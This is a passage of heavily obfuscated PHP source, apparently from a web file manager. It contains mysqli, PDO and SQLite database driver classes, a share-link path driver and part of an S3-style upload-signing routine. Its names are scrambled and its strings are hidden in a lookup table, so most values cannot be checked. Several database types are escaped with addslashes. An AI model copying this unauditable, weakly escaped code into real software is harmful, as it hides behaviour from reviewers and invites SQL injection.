think_exception(mysqli_connect_error()); } $¤Ã·»ä© = $this->linkID[$¦±ºîö°]->server_version; $this->linkID[$¦±ºîö°]->query($ñÚÓ²á«[898] . think_config($ñÚÓ²á«[899]) . $ñÚÓ²á«[58]); if ($¤Ã·»ä© > $ñÚÓ²á«[900]) { $this->linkID[$¦±ºîö°]->query($ñÚÓ²á«[901]); } $this->connected = !0; if (1 != think_config($ñÚÓ²á«[22])) { unset($this->config); } } return $this->linkID[$¦±ºîö°]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($®Æ®Ê¬) { $¡š¶ÁÌ× =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $®Æ®Ê¬; if ($this->queryID) { $this->free(); } think_action_status($¡š¶ÁÌ×[23], 1); think_status($¡š¶ÁÌ×[24]); $this->queryID = $this->_linkID->query($®Æ®Ê¬); if ($this->_linkID->more_results()) { while (($§‡ªÏŞë = $this->_linkID->next_result()) != NULL) { $§‡ªÏŞë->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¹áôÙ¡™) { $ì´Ÿêà³ =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¹áôÙ¡™; if ($this->queryID) { $this->free(); } think_action_status($ì´Ÿêà³[25], 1); think_status($ì´Ÿêà³[24]); $ÌÛ„Ü÷ü = $this->_linkID->query($¹áôÙ¡™); $this->debug(); if (!1 === $ÌÛ„Ü÷ü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $³ïŒ÷°ñ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$³ïŒ÷°ñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $È×‘…Ğ„ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$È×‘…Ğ„) { $this->error(); return !1; } } return !0; } private function getAll() { $–ü£¿³Û = array(); if ($this->numRows > 0) { for ($ø½ı“§Á = 0; $ø½ı“§Á < $this->numRows; $ø½ı“§Á++) { $–ü£¿³Û[$ø½ı“§Á] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $–ü£¿³Û; } public function getFields($Ÿ³ÜÆ’) { $ƒîŞ¼™ =& $_SERVER[™¾ÇÙ¯¹]; $Î¿¿ËÄ = $this->query($ƒîŞ¼™[905] . $this->parseKey($Ÿ³ÜÆ’)); $‡¥™¹Ğ‚ = array(); if ($Î¿¿ËÄ) { foreach ($Î¿¿ËÄ as $áşº‚û¸ => $â¯ëıûì) { $‡¥™¹Ğ‚[$â¯ëıûì[$ƒîŞ¼™[31]]] = array($ƒîŞ¼™[32] => $â¯ëıûì[$ƒîŞ¼™[31]], $ƒîŞ¼™[33] => $â¯ëıûì[$ƒîŞ¼™[34]], $ƒîŞ¼™[35] => (bool) ($â¯ëıûì[$ƒîŞ¼™[36]] === $ƒîŞ¼™[12]), $ƒîŞ¼™[37] => $â¯ëıûì[$ƒîŞ¼™[38]], $ƒîŞ¼™[39] => strtolower($â¯ëıûì[$ƒîŞ¼™[40]]) == $ƒîŞ¼™[41], $ƒîŞ¼™[42] => strtolower($â¯ëıûì[$ƒîŞ¼™[43]]) == $ƒîŞ¼™[44]); } } return $‡¥™¹Ğ‚; } public function getTables($ÑÌÀ¢ · = '') { $Í¹È®ßŠ =& $_SERVER[™¾ÇÙ¯¹]; $Ó¦Ğî† = !empty($ÑÌÀ¢ ·) ? $Í¹È®ßŠ[907] . $ÑÌÀ¢ · . $Í¹È®ßŠ[908] : $Í¹È®ßŠ[909]; $´ŒŞÀã‰ = $this->query($Ó¦Ğî†); $”¢¾µËş = array(); if ($´ŒŞÀã‰) { foreach ($´ŒŞÀã‰ as $‘–Ö•‹ => $¾Éû“ŠÎ) { $”¢¾µËş[$‘–Ö•‹] = current($¾Éû“ŠÎ); } } return $”¢¾µËş; } public function replace($­¯©Û, $Ø…¹Å»á = array()) { $Ä‚‘ì¡¸ =& $_SERVER[™¾ÇÙ¯¹]; foreach ($­¯©Û as $‚£æÅ„µ => $×á¯•Äå) { $Ô’Ú­§û = $this->parseValue($×á¯•Äå); if (is_scalar($Ô’Ú­§û)) { $÷Ê¿×ƒÌ[] = $Ô’Ú­§û; $Â®åæÉ†[] = $this->parseKey($‚£æÅ„µ); } } $¨ìáßŠ = $Ä‚‘ì¡¸[910] . $this->parseTable($Ø…¹Å»á[$Ä‚‘ì¡¸[288]]) . $Ä‚‘ì¡¸[911] . implode($Ä‚‘ì¡¸[50], $Â®åæÉ†) . $Ä‚‘ì¡¸[912] . implode($Ä‚‘ì¡¸[50], $÷Ê¿×ƒÌ) . $Ä‚‘ì¡¸[913]; return $this->execute($¨ìáßŠ); } public function insertAll($©É´™ˆ, $Ä×©‰è¦ = array(), $Ø¯¸÷ƒ— = false) { $¢‡»ı˜Ë =& $_SERVER[™¾ÇÙ¯¹]; if (!is_array($©É´™ˆ[0])) { return !1; } $°áÒ«à = array_keys($©É´™ˆ[0]); $²éÄ¼€€ = array(); foreach ($©É´™ˆ as $ØÈÕÃÔ) { $ÅÛ¡· = array(); foreach ($ØÈÕÃÔ as $†„¬·¦’ => $Ø€˜’àÛ) { $Ø€˜’àÛ = $this->parseValue($Ø€˜’àÛ); if (is_scalar($Ø€˜’àÛ)) { $ÅÛ¡·[] = $Ø€˜’àÛ; } } $²éÄ¼€€[] = $¢‡»ı˜Ë[269] . implode($¢‡»ı˜Ë[50], $ÅÛ¡·) . $¢‡»ı˜Ë[913]; } array_walk($°áÒ«à, array($this, $¢‡»ı˜Ë[914])); $™€İÄ = $Ø¯¸÷ƒ— ? $¢‡»ı˜Ë[915] : $¢‡»ı˜Ë[916]; $Ÿ“ÂÜ›œ = $™€İÄ . $¢‡»ı˜Ë[917] . $this->parseTable($Ä×©‰è¦[$¢‡»ı˜Ë[288]]) . $¢‡»ı˜Ë[911] . implode($¢‡»ı˜Ë[50], $°áÒ«à) . $¢‡»ı˜Ë[918] . implode($¢‡»ı˜Ë[50], $²éÄ¼€€); return $this->execute($Ÿ“ÂÜ›œ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ø»‘×õÑ =& $_SERVER[™¾ÇÙ¯¹]; $this->error = $this->_linkID->errno . $Ø»‘×õÑ[4] . $this->_linkID->error; if ($Ø»‘×õÑ[12] != $this->queryStr) { $this->error .= LNG($Ø»‘×õÑ[48]) . $this->queryStr; } think_trace($this->error, $Ø»‘×õÑ[12], $Ø»‘×õÑ[49]); return $this->error; } public function escapeString($Á¿õŞÒ©) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Á¿õŞÒ©); } else { return addslashes($Á¿õŞÒ©); } } public function parseKey(&$êéÊ¦á¤, $è¡£º£ˆ = true) { $ ÉóÂ¥ =& $_SERVER[™¾ÇÙ¯¹]; if ($è¡£º£ˆ) { $êéÊ¦á¤ = $this->parseKeyCheck($êéÊ¦á¤); } if ($êéÊ¦á¤ != $ ÉóÂ¥[188] && !preg_match($ ÉóÂ¥[919], $êéÊ¦á¤)) { $êéÊ¦á¤ = $ ÉóÂ¥[393] . trim($êéÊ¦á¤, $ ÉóÂ¥[393]) . $ ÉóÂ¥[393]; } return $êéÊ¦á¤; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ĞÂÒ Ç = '') { $İ§ÍÃƒÚ =& $_SERVER[™¾ÇÙ¯¹]; if (!class_exists($İ§ÍÃƒÚ[922])) { think_exception(think_lang($İ§ÍÃƒÚ[14]) . $İ§ÍÃƒÚ[923]); } if (!empty($ĞÂÒ Ç)) { $this->config = $ĞÂÒ Ç; if (empty($this->config[$İ§ÍÃƒÚ[17]])) { $this->config[$İ§ÍÃƒÚ[17]] = array(); } } } public function connect($ä’ïöîµ = '', $§±“ë¢ = 0) { $°Ã‰ùıŒ =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($this->linkID[$§±“ë¢])) { if (empty($ä’ïöîµ)) { $ä’ïöîµ = $this->config; } $Ğ¯ûæĞ½ = !empty($ä’ïöîµ[$°Ã‰ùıŒ[17]][$°Ã‰ùıŒ[18]]) ? $ä’ïöîµ[$°Ã‰ùıŒ[17]][$°Ã‰ùıŒ[18]] : $this->pconnect; if ($Ğ¯ûæĞ½) { $ä’ïöîµ[$°Ã‰ùıŒ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$§±“ë¢] = new PDO($ä’ïöîµ[$°Ã‰ùıŒ[924]], $ä’ïöîµ[$°Ã‰ùıŒ[896]], $ä’ïöîµ[$°Ã‰ùıŒ[897]], $ä’ïöîµ[$°Ã‰ùıŒ[17]]); } catch (PDOException $íËà†ì°) { think_exception($íËà†ì°->getMessage()); } $this->dbType = $this->_getDsnType($ä’ïöîµ[$°Ã‰ùıŒ[924]]); if (in_array($this->dbType, array($°Ã‰ùıŒ[925], $°Ã‰ùıŒ[926], $°Ã‰ùıŒ[927], $°Ã‰ùıŒ[928]))) { think_exception($°Ã‰ùıŒ[929] . $this->dbType . $°Ã‰ùıŒ[930] . $this->dbType . $°Ã‰ùıŒ[931]); } if (!$this->linkID[$§±“ë¢]) { think_exception($°Ã‰ùıŒ[932]); } try { $this->linkID[$§±“ë¢]->exec($°Ã‰ùıŒ[933] . think_config($°Ã‰ùıŒ[899])); } catch (Exception $íËà†ì°) { } $this->connected = !0; if (1 != think_config($°Ã‰ùıŒ[22])) { unset($this->config); } } return $this->linkID[$§±“ë¢]; } public function free() { $this->PDOStatement = null; } public function query($ô§å¶“Î, $®š£ú¬ = array()) { $µìÅçü• =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ô§å¶“Î; if (!empty($®š£ú¬)) { $this->queryStr .= $µìÅçü•[934] . print_r($®š£ú¬, !0) . $µìÅçü•[935]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($µìÅçü•[23], 1); think_status($µìÅçü•[24]); $this->PDOStatement = $this->_linkID->prepare($ô§å¶“Î); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $õ¥ÉÉş = $this->PDOStatement->execute($®š£ú¬); $this->debug(); if (!1 === $õ¥ÉÉş) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ãİÖê•, $°¿¯ÃÔ× = array()) { $Ùè˜ÛÁÍ =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ãİÖê•; if (!empty($°¿¯ÃÔ×)) { $this->queryStr .= $Ùè˜ÛÁÍ[934] . print_r($°¿¯ÃÔ×, !0) . $Ùè˜ÛÁÍ[935]; } $åÕÉõÇ¹ = !1; if ($this->dbType == $Ùè˜ÛÁÍ[928]) { if (preg_match($Ùè˜ÛÁÍ[936], $this->queryStr, $”†ş‹Úì)) { $this->table = think_config($Ùè˜ÛÁÍ[937]) . str_ireplace(think_config($Ùè˜ÛÁÍ[938]), $Ùè˜ÛÁÍ[252], $”†ş‹Úì[2]); $åÕÉõÇ¹ = (bool) $this->query($Ùè˜ÛÁÍ[939] . strtoupper($this->table) . $Ùè˜ÛÁÍ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ùè˜ÛÁÍ[25], 1); think_status($Ùè˜ÛÁÍ[24]); $this->PDOStatement = $this->_linkID->prepare($ãİÖê•); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ßÂõ“¿£ = $this->PDOStatement->execute($°¿¯ÃÔ×); $this->debug(); if (!1 === $ßÂõ“¿£) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($åÕÉõÇ¹ || preg_match($Ùè˜ÛÁÍ[940], $ãİÖê•)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰·ÂÈÉ = $this->_linkID->commit(); $this->transTimes = 0; if (!$‰·ÂÈÉ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $µ—„×»Î = $this->_linkID->rollback(); $this->transTimes = 0; if (!$µ—„×»Î) { $this->error(); return !1; } } return !0; } private function getAll() { $‰ö¥ôïç = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($‰ö¥ôïç); return $‰ö¥ôïç; } public function getFields($ïùÆ×ÊË) { $ÍìæÛü =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!0); if (think_config($ÍìæÛü[941])) { $˜ŞÎÌß = str_replace($ÍìæÛü[942], $ïùÆ×ÊË, think_config($ÍìæÛü[941])); } else { switch ($this->dbType) { case $ÍìæÛü[925]: case $ÍìæÛü[943]: $˜ŞÎÌß = "\x53\105\114\x45\103\x54\40\40\x20\x63\x6f\154\165\155\156\137\156\141\x6d\145\40\141\163\x20\x27\116\141\x6d\145\x27\x2c\40\x20\x20\144\x61\x74\141\x5f\164\171\x70\x65\x20\x61\x73\40\47\x54\171\160\145\47\54\40\x20\40\143\157\154\x75\155\x6e\x5f\144\145\146\x61\165\x6c\164\40\x61\x73\x20\47\x44\145\146\x61\165\154\164\47\x2c\x20\x20\x20\151\x73\x5f\156\x75\x6c\154\x61\142\154\145\40\141\x73\40\47\116\x75\154\154\x27\12\x9\11\106\122\117\x4d\11\x69\x6e\x66\157\162\155\141\x74\151\157\x6e\x5f\x73\143\150\x65\155\141\56\164\x61\x62\x6c\145\x73\x20\x41\x53\40\164\xa\x9\x9\112\117\x49\x4e\11\151\x6e\x66\x6f\162\x6d\x61\164\151\x6f\x6e\137\x73\143\150\145\155\141\56\x63\x6f\x6c\x75\x6d\x6e\163\40\x41\123\40\143\xa\11\11\x4f\116\40\x20\x74\x2e\164\141\x62\x6c\145\137\143\x61\164\x61\154\157\x67\40\75\x20\x63\x2e\164\x61\x62\154\x65\137\x63\x61\x74\x61\x6c\x6f\x67\12\x9\x9\101\x4e\x44\x20\x74\x2e\x74\x61\142\x6c\x65\x5f\163\x63\x68\x65\x6d\141\40\75\x20\143\x2e\x74\141\x62\x6c\x65\137\x73\x63\x68\145\155\x61\xa\x9\x9\101\x4e\x44\40\x74\56\x74\x61\x62\154\x65\x5f\x6e\x61\x6d\x65\x20\x3d\x20\x63\x2e\164\141\x62\154\145\137\x6e\141\155\x65\12\x9\11\x57\x48\x45\x52\x45\40\x20\40\164\56\164\141\142\x6c\x65\x5f\x6e\141\155\145\x20\x3d\40\47{$ïùÆ×ÊË}\47"; break; case $ÍìæÛü[944]: $˜ŞÎÌß = $ÍìæÛü[945] . $ïùÆ×ÊË . $ÍìæÛü[946]; break; case $ÍìæÛü[926]: case $ÍìæÛü[928]: $˜ŞÎÌß = $ÍìæÛü[947] . $ÍìæÛü[948] . $ÍìæÛü[949] . strtoupper($ïùÆ×ÊË) . $ÍìæÛü[950] . strtoupper($ïùÆ×ÊË) . $ÍìæÛü[951]; break; case $ÍìæÛü[952]: $˜ŞÎÌß = $ÍìæÛü[953] . $ïùÆ×ÊË . $ÍìæÛü[954]; break; case $ÍìæÛü[927]: break; case $ÍìæÛü[955]: default: $˜ŞÎÌß = $ÍìæÛü[956] . ($this->dbType == $ÍìæÛü[955] ? "\140{$ïùÆ×ÊË}\x60" : $ïùÆ×ÊË); } } $µÃöªá = $this->query($˜ŞÎÌß); $Ä‘è¢¹Æ = array(); if ($µÃöªá) { foreach ($µÃöªá as $½ÈÛ˜÷Œ => $±Êìº¾) { $±Êìº¾ = array_change_key_case($±Êìº¾); $±Êìº¾[$ÍìæÛü[32]] = isset($±Êìº¾[$ÍìæÛü[32]]) ? $±Êìº¾[$ÍìæÛü[32]] : $ÍìæÛü[252]; $±Êìº¾[$ÍìæÛü[33]] = isset($±Êìº¾[$ÍìæÛü[33]]) ? $±Êìº¾[$ÍìæÛü[33]] : $ÍìæÛü[252]; $Î’‘™– = isset($±Êìº¾[$ÍìæÛü[282]]) ? $±Êìº¾[$ÍìæÛü[282]] : $±Êìº¾[$ÍìæÛü[32]]; $Ä‘è¢¹Æ[$Î’‘™–] = array($ÍìæÛü[32] => $Î’‘™–, $ÍìæÛü[33] => $±Êìº¾[$ÍìæÛü[33]], $ÍìæÛü[35] => (bool) (isset($±Êìº¾[$ÍìæÛü[103]]) && $±Êìº¾[$ÍìæÛü[103]] === $ÍìæÛü[12] || isset($±Êìº¾[$ÍìæÛü[35]]) && $±Êìº¾[$ÍìæÛü[35]] === $ÍìæÛü[12]), $ÍìæÛü[37] => isset($±Êìº¾[$ÍìæÛü[37]]) ? $±Êìº¾[$ÍìæÛü[37]] : (isset($±Êìº¾[$ÍìæÛü[56]]) ? $±Êìº¾[$ÍìæÛü[56]] : $ÍìæÛü[252]), $ÍìæÛü[39] => isset($±Êìº¾[$ÍìæÛü[94]]) ? strtolower($±Êìº¾[$ÍìæÛü[94]]) == $ÍìæÛü[41] : (isset($±Êìº¾[$ÍìæÛü[57]]) ? $±Êìº¾[$ÍìæÛü[57]] : !1), $ÍìæÛü[42] => isset($±Êìº¾[$ÍìæÛü[957]]) ? strtolower($±Êìº¾[$ÍìæÛü[957]]) == $ÍìæÛü[44] : (isset($±Êìº¾[$ÍìæÛü[94]]) ? $±Êìº¾[$ÍìæÛü[94]] : !1)); } } return $Ä‘è¢¹Æ; } public function getTables($´ŠÍ”¸ş = '') { $å­É†‚€ =& $_SERVER[™¾ÇÙ¯¹]; if (think_config($å­É†‚€[958])) { $±ü•±É´ = str_replace($å­É†‚€[959], $´ŠÍ”¸ş, think_config($å­É†‚€[958])); } else { switch ($this->dbType) { case $å­É†‚€[926]: case $å­É†‚€[928]: $±ü•±É´ = $å­É†‚€[960]; break; case $å­É†‚€[925]: case $å­É†‚€[943]: $±ü•±É´ = $å­É†‚€[961]; break; case $å­É†‚€[952]: $±ü•±É´ = $å­É†‚€[962]; break; case $å­É†‚€[927]: think_exception(think_lang($å­É†‚€[963]) . $å­É†‚€[964]); break; case $å­É†‚€[944]: $±ü•±É´ = $å­É†‚€[45] . $å­É†‚€[46] . $å­É†‚€[47]; break; case $å­É†‚€[955]: default: if (!empty($´ŠÍ”¸ş)) { $±ü•±É´ = $å­É†‚€[907] . $´ŠÍ”¸ş . $å­É†‚€[908]; } else { $±ü•±É´ = $å­É†‚€[909]; } } } $©¢Ä¶²Ä = $this->query($±ü•±É´); $âµ£¬ğ = array(); foreach ($©¢Ä¶²Ä as $õà’‡Ï± => $‹×‘®˜¢) { $âµ£¬ğ[$õà’‡Ï±] = current($‹×‘®˜¢); } return $âµ£¬ğ; } protected function parseLimit($¨İ÷éåÄ) { $²Š²¼¸œ =& $_SERVER[™¾ÇÙ¯¹]; $¸ë™Å˜º = $²Š²¼¸œ[12]; if (!empty($¨İ÷éåÄ)) { switch ($this->dbType) { case $²Š²¼¸œ[952]: case $²Š²¼¸œ[944]: $¨İ÷éåÄ = explode($²Š²¼¸œ[50], $¨İ÷éåÄ); if (count($¨İ÷éåÄ) > 1) { $¸ë™Å˜º .= $²Š²¼¸œ[51] . $¨İ÷éåÄ[1] . $²Š²¼¸œ[52] . $¨İ÷éåÄ[0] . $²Š²¼¸œ[53]; } else { $¸ë™Å˜º .= $²Š²¼¸œ[51] . $¨İ÷éåÄ[0] . $²Š²¼¸œ[53]; } break; case $²Š²¼¸œ[925]: case $²Š²¼¸œ[943]: break; case $²Š²¼¸œ[927]: break; case $²Š²¼¸œ[926]: case $²Š²¼¸œ[928]: break; case $²Š²¼¸œ[955]: default: $¸ë™Å˜º .= $²Š²¼¸œ[51] . $¨İ÷éåÄ . $²Š²¼¸œ[53]; } } return $¸ë™Å˜º; } public function parseKey(&$û»Í±İº, $˜¸„ß“ = true) { $í­şãÈ² =& $_SERVER[™¾ÇÙ¯¹]; if ($˜¸„ß“) { $û»Í±İº = $this->parseKeyCheck($û»Í±İº); } if ($this->dbType == $í­şãÈ²[955]) { if ($û»Í±İº != $í­şãÈ²[188] && !preg_match($í­şãÈ²[919], $û»Í±İº)) { $û»Í±İº = $í­şãÈ²[393] . trim($û»Í±İº, $í­şãÈ²[393]) . $í­şãÈ²[393]; } return $û»Í±İº; } else { return parent::parseKey($û»Í±İº, $˜¸„ß“); } } public function close() { $this->_linkID = null; } public function error() { $âà¤€ÇÛ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->PDOStatement) { $‘¯œ¡ùÈ = $this->PDOStatement->errorInfo(); $this->error = $‘¯œ¡ùÈ[1] . $âà¤€ÇÛ[4] . $‘¯œ¡ùÈ[2]; } else { $this->error = $âà¤€ÇÛ[12]; } if ($âà¤€ÇÛ[12] != $this->queryStr) { $this->error .= LNG($âà¤€ÇÛ[48]) . $this->queryStr; } think_trace($this->error, $âà¤€ÇÛ[12], $âà¤€ÇÛ[49]); return $this->error; } public function escapeString($ÊÁ¤¨¡³) { $·À¸ŒŒ  =& $_SERVER[™¾ÇÙ¯¹]; switch ($this->dbType) { case $·À¸ŒŒ [952]: case $·À¸ŒŒ [925]: case $·À¸ŒŒ [943]: case $·À¸ŒŒ [955]: return addslashes($ÊÁ¤¨¡³); case $·À¸ŒŒ [927]: case $·À¸ŒŒ [944]: case $·À¸ŒŒ [926]: case $·À¸ŒŒ [928]: return str_ireplace($·À¸ŒŒ [58], $·À¸ŒŒ [59], $ÊÁ¤¨¡³); } } protected function parseValue($³ù««â¼) { $ú’ïÁ½° =& $_SERVER[™¾ÇÙ¯¹]; if (is_string($³ù««â¼)) { $ÀâÔÙ– = strpos($³ù««â¼, $ú’ïÁ½°[4]) === 0 && in_array($³ù««â¼, array_keys($this->bind)); $³ù««â¼ = $ÀâÔÙ– ? $this->escapeString($³ù««â¼) : $ú’ïÁ½°[965] . $this->escapeString($³ù««â¼) . $ú’ïÁ½°[965]; } elseif (isset($³ù««â¼[0]) && is_string($³ù««â¼[0]) && strtolower($³ù««â¼[0]) == $ú’ïÁ½°[306]) { $³ù««â¼ = $this->escapeString($³ù««â¼[1]); } elseif (is_array($³ù««â¼)) { $³ù««â¼ = array_map(array($this, $ú’ïÁ½°[966]), $³ù««â¼); } elseif (is_bool($³ù««â¼)) { $³ù««â¼ = $³ù««â¼ ? $ú’ïÁ½°[88] : $ú’ïÁ½°[197]; } elseif (is_null($³ù««â¼)) { $³ù««â¼ = $ú’ïÁ½°[103]; } return $³ù««â¼; } public function getLastInsertId() { $æÖ™¿÷Ä =& $_SERVER[™¾ÇÙ¯¹]; switch ($this->dbType) { case $æÖ™¿÷Ä[952]: case $æÖ™¿÷Ä[944]: case $æÖ™¿÷Ä[925]: case $æÖ™¿÷Ä[943]: case $æÖ™¿÷Ä[927]: case $æÖ™¿÷Ä[955]: return $this->_linkID->lastInsertId(); case $æÖ™¿÷Ä[926]: case $æÖ™¿÷Ä[928]: $åÙÂñª€ = $this->table; $Ú§–êèï = $this->query("\123\105\114\105\103\124\40{$åÙÂñª€}\x2e\x63\x75\162\x72\166\141\154\x20\143\165\162\162\166\x61\154\40\x46\x52\117\115\40\x64\165\141\154"); return $Ú§–êèï ? $Ú§–êèï[0][$æÖ™¿÷Ä[967]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($«Õáºî™) { $ë—ØÒ£Š =& $_SERVER[™¾ÇÙ¯¹]; if (!CacheLock::fileLock($ë—ØÒ£Š[13])) { return !1; } $Òú˜ààÒ = parent::query($«Õáºî™); CacheLock::fileUnLock($ë—ØÒ£Š[13]); return $Òú˜ààÒ; } public function execute($’ıÒè’ş) { $é›Õßº =& $_SERVER[™¾ÇÙ¯¹]; if (!CacheLock::fileLock($é›Õßº[13])) { return !1; } $Õ‚Ó£ó = parent::execute($’ıÒè’ş); CacheLock::fileUnLock($é›Õßº[13]); return $Õ‚Ó£ó; } } goto bÀƒ’ÀÚÜÓ; e¹¹ÒºÉ³®: define($_SERVER[™¾ÇÙ¯¹][241], 1); define($_SERVER[™¾ÇÙ¯¹][242], 0); define($_SERVER[™¾ÇÙ¯¹][243], 2); goto a—À§öÚˆ¯; c…ê™¯÷øï: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¬ÊçÀ–ˆ) { $this->pathParse = $¬ÊçÀ–ˆ; } protected function infoParse($ÌêšÆ”, $ßŸÅ·œå = false) { $”ú»î…º =& $_SERVER[™¾ÇÙ¯¹]; return Action($”ú»î…º[1183])->sharePathInfo($this->pathParse[$”ú»î…º[84]], !0, $ßŸÅ·œå); } public function listPath($¶£ˆƒá©, $ã©»—ØÁ = false) { $âáÔú¨” =& $_SERVER[™¾ÇÙ¯¹]; $¯’°È†â = IO::listPath($¶£ˆƒá©, $ã©»—ØÁ); if (!$¯’°È†â) { return $¯’°È†â; } if (is_array($¯’°È†â[$âáÔú¨”[1344]])) { $Ü±ßÍõà = Action($âáÔú¨”[1353])->parsePathChildren($¯’°È†â[$âáÔú¨”[1344]], array($âáÔú¨”[429] => $¶£ˆƒá©)); $¯’°È†â[$âáÔú¨”[1344]] = Action($âáÔú¨”[1183])->shareItemInfo($Ü±ßÍõà); } foreach ($¯’°È†â as $ÃàÓâºã => $‰´ªêÂ) { if (!in_array($ÃàÓâºã, array($âáÔú¨”[83], $âáÔú¨”[82]))) { continue; } foreach ($‰´ªêÂ as $‰ƒÛàËÈ => $Ü±ßÍõà) { $Ü±ßÍõà = Action($âáÔú¨”[1353])->parsePathChildren($Ü±ßÍõà, array($âáÔú¨”[429] => $¶£ˆƒá©)); $¯’°È†â[$ÃàÓâºã][$‰ƒÛàËÈ] = Action($âáÔú¨”[1183])->shareItemInfo($Ü±ßÍõà); } } return $¯’°È†â; } public function listAll($ã¨ÛÅ¾Ì) { $ÔÇø•Ì— =& $_SERVER[™¾ÇÙ¯¹]; $êŸ€”¨º = IO::listAll($ã¨ÛÅ¾Ì); foreach ($êŸ€”¨º as &$ĞÒå£) { $ûöıÃÂ = IO::info($ĞÒå£[$ÔÇø•Ì—[84]]); $ûöıÃÂ = is_array($ûöıÃÂ) ? $ûöıÃÂ : array(); $ĞÒå£ = array_merge($ûöıÃÂ, $ĞÒå£); $ĞÒå£[$ÔÇø•Ì—[86]] = Action($ÔÇø•Ì—[1183])->shareItemInfo($ĞÒå£); } unset($ĞÒå£); return $êŸ€”¨º; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ªïô¢) { parent::__construct($ªïô¢); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ƒ÷İÎìÔ) { parent::__construct($ƒ÷İÎìÔ); $this->signatureVersion($_SERVER[™¾ÇÙ¯¹][216]); } public function uploadFormData($ÊÜÀÅ¶‡, $È½‘÷ß¸ = 3600) { $Û¶ÓÍÑ˜ =& $_SERVER[™¾ÇÙ¯¹]; $ì‰í˜² = $Û¶ÓÍÑ˜[198]; $ıöæÊ¨Î = $Û¶ÓÍÑ˜[1354]; $÷İ–Éá = $Û¶ÓÍÑ˜[62]; $ó“Ğßà = gmdate($Û¶ÓÍÑ˜[1355]); $ •·š×€ = gmdate($Û¶ÓÍÑ˜[766]); $ìõ©ğ‡ = $Û¶ÓÍÑ˜[1356]; $ôİÖĞÛ = $È½‘÷ß¸ . $Û¶ÓÍÑ˜[12]; $ƒ‚À«ûƒ = $Û¶ÓÍÑ˜[1318]; $ÍÎÆ¾û¡ = array($this->accessKey, $ •·š×€, $this->region, $÷İ–Éá, $ìõ©ğ‡); $áÜŠù¦Ï = implode($Û¶ÓÍÑ˜[8], $ÍÎÆ¾û¡); $Éìé¾Æ– = array($Û¶ÓÍÑ˜[1320] => gmdate($Û¶ÓÍÑ˜[1319], strtotime($Û¶ÓÍÑ˜[1357])), $Û¶ÓÍÑ˜[1321] => array(array($Û¶ÓÍÑ˜[1323] => $this->bucket), array($Û¶ÓÍÑ˜[1322] => $ì‰í˜²), array($Û¶ÓÍÑ˜[1324], $Û¶ÓÍÑ˜[1325], $Û¶ÓÍÑ˜[12]), array($Û¶ÓÍÑ˜[1324], $Û¶ÓÍÑ˜[1358], $Û¶ÓÍÑ˜[12]), array($Û¶ÓÍÑ˜[1324], $Û¶ÓÍÑ˜[1359], $Û¶ÓÍÑ˜[12]), array($Û¶ÓÍÑ˜[1326] => $ƒ‚À«ûƒ), array($Û¶ÓÍÑ˜[1360] => $áÜŠù¦Ï), array($Û¶ÓÍÑ˜[1361] => $ıöæÊ¨Î), array($Û¶ÓÍÑ˜[1362] => $ó“Ğßà), array($Û¶ÓÍÑ˜[1363] => $ôİÖĞÛ))); $™óò™Î = base64_encode(json_encode($Éìé¾Æ–)); $¿½êŸıá = hash_hmac($Û¶ÓÍÑ˜[1364], $ •·š×€, $Û¶ÓÍÑ˜[1365] . $this->secret, !0); $‚Ëîèøš = hash_hmac($Û¶ÓÍÑ˜[1364], $this->region, $¿½êŸıá, !0); $şÊı•ÊÙ = hash_hmac($Û¶ÓÍÑ˜[1364], $÷İ–Éá, $‚Ëîèøš, !0); $ş§Àİ‡æ = hash_hmac($Û¶ÓÍÑ˜[1364], $ìõ©ğ‡, $şÊı•ÊÙ, !0); $Šˆµè´æ = hash_hmac($Û¶ÓÍÑ˜[1364], $™óò™Î, $ş§Àİ‡æ); $ˆÇûÆÂ‚ = array($Û¶ÓÍÑ˜[215] => $Û¶ÓÍÑ˜[12], $Û¶ÓÍÑ˜[1366] => 